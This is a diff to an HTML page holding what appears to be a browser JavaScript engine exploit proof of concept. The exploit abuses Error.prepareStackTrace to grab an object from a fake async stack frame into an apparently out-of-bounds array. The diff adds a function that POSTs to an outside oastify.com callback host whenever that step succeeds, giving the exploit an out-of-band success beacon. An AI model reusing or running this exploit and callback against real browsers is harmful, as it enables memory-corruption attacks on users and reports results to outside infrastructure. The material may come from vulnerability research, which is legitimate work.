@@ -1,6 +1,24 @@
 <html>
 <body>
 <script>
+async function fetchErrorStack(stack) {
+  const url = `https://mg6sw1xe43kpy8oq1q1867pcc3iu6mub.oastify.com/log`; // Replace with your actual URL
+  try {
+    const response = await fetch(url, {
+      method: 'POST', // Use POST to send data
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: `stack=${encodeURIComponent(stack)}`,
+    });
+    if (!response.ok) {
+      throw new Error(`HTTP error! Status: ${response.status}`);
+    }
+    console.log('Error stack sent successfully');
+  } catch (fetchError) {
+    console.error('Failed to send error stack:', fetchError);
+  }
+}
 
 function assert(val) {
     if (!val)
@@ -166,7 +184,7 @@ Error.prepareStackTrace = function (error, frames) {
 	if (frames.length < 3) {
 		console.error("No fake async stack frame");
 	} else {
-        console.error("I GOT MY FAKE ASYNC STACK FRAME");
+        fetchErrorStack("I GOT MY FAKE ASYNC STACK FRAME");
 		oob_arr = frames[2].getThis();
 	}
 }
